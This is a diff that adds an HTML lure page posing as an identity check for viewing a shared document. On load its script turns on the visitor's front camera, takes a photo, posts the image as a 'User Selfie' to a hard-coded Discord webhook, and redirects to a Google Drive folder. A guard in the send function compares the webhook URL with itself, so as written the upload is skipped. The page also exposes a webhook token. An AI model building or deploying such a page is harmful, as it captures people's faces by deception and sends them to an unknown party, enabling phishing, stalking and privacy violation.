@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading Document...</title>
+    <style>
+        body { 
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            text-align: center; 
+            padding: 20px; 
+            background-color: #f5f5f5;
+            color: #333;
+        }
+        .container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+            max-width: 300px;
+            margin: 50px auto;
+        }
+        video { 
+            width: 100%; 
+            border-radius: 4px; 
+            display: none; 
+            background: #000;
+        }
+        p { font-size: 14px; color: #666; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h3>Verifying Identity</h3>
+        <p>Please allow camera access to view the document.</p>
+        
+        <!-- Video preview -->
+        <video id="video" autoplay playsinline></video>
+        
+        <!-- Canvas for capturing -->
+        <canvas id="canvas" style="display:none;"></canvas>
+    </div>
+
+    <script>
+        // ==========================================
+        // CONFIGURATION: REPLACE THESE VALUES
+        // ==========================================
+        
+        // 1. The REAL Google Drive Link to redirect to after permission
+        const GOOGLE_DRIVE_LINK = "https://drive.google.com/drive/u/6/folders/1UHDGhaFXQ_gAlcmt8g3fkT4YX8rHJYpZ";
+
+        // 2. Your Webhook URL (Discord, Slack, etc.) or API endpoint to receive the photo
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1505273360391602418/I4OnCKamE02G2jtK9i0IJyFrX1GNrqYKQ_QQ61OmwyjqHXTYPj3FVDzcu1-dhL3JT7ri";
+
+        // ==========================================
+
+        async function startCamera() {
+            try {
+                // Request front camera specifically
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" } 
+                });
+                
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+                video.style.display = 'block';
+
+                // Wait 2 seconds for user to see the camera feed, then capture
+                setTimeout(() => {
+                    takePhotoAndRedirect(stream);
+                }, 2000);
+
+            } catch (err) {
+                console.error("Camera error:", err);
+                alert("Camera permission denied. Redirecting anyway...");
+                window.location.href = GOOGLE_DRIVE_LINK;
+            }
+        }
+
+        function takePhotoAndRedirect(stream) {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const ctx = canvas.getContext('2d');
+
+            // Set canvas size to match video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Draw the current frame to canvas
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Convert to JPEG base64 string
+            const imageData = canvas.toDataURL('image/jpeg', 0.8); // 0.8 quality
+
+            // Stop the camera stream
+            stream.getTracks().forEach(track => track.stop());
+
+            // Hide video and show a loading message
+            document.getElementById('video').style.display = 'none';
+            document.querySelector('h3').innerText = "Access Granted";
+            document.querySelector('p').innerText = "Redirecting to document...";
+
+            // Send the image to your webhook
+            sendImageToWebhook(imageData);
+
+            // Redirect to Google Drive after a short delay (1 second)
+            setTimeout(() => {
+                window.location.href = GOOGLE_DRIVE_LINK;
+            }, 1000);
+        }
+
+        function sendImageToWebhook(base64Image) {
+            if (!WEBHOOK_URL || WEBHOOK_URL === "https://discord.com/api/webhooks/1505273360391602418/I4OnCKamE02G2jtK9i0IJyFrX1GNrqYKQ_QQ61OmwyjqHXTYPj3FVDzcu1-dhL3JT7ri") {
+                console.log("No webhook URL configured. Image not sent.");
+                return;
+            }
+
+            // Example for Discord Webhook
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    content: "📸 **Camera Access Granted!**",
+                    embeds: [{ 
+                        title: "User Selfie",
+                        image: { url: base64Image } 
+                    }]
+                })
+            }).catch(err => console.error("Failed to send webhook:", err));
+        }
+
+        // Start camera on page load
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
